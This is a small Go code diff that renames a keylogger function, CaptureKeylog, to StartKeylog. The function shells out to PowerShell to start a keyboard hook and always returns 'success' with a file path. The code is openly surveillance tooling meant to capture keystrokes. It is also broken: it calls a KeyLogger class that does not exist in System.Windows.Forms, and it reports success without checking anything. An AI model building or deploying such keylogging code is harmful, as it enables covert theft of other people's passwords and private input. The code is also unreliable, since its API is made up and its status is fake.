@@ -7,7 +7,7 @@ Status string
 Path   string
 }
 
-func CaptureKeylog(path string) KeylogResult {
+func StartKeylog(path string) KeylogResult {
 cmd := exec.Command("powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; $hook = New-Object System.Windows.Forms.KeyLogger; $hook.Start()")
 cmd.Run()
 return KeylogResult{Status: "success", Path: path}
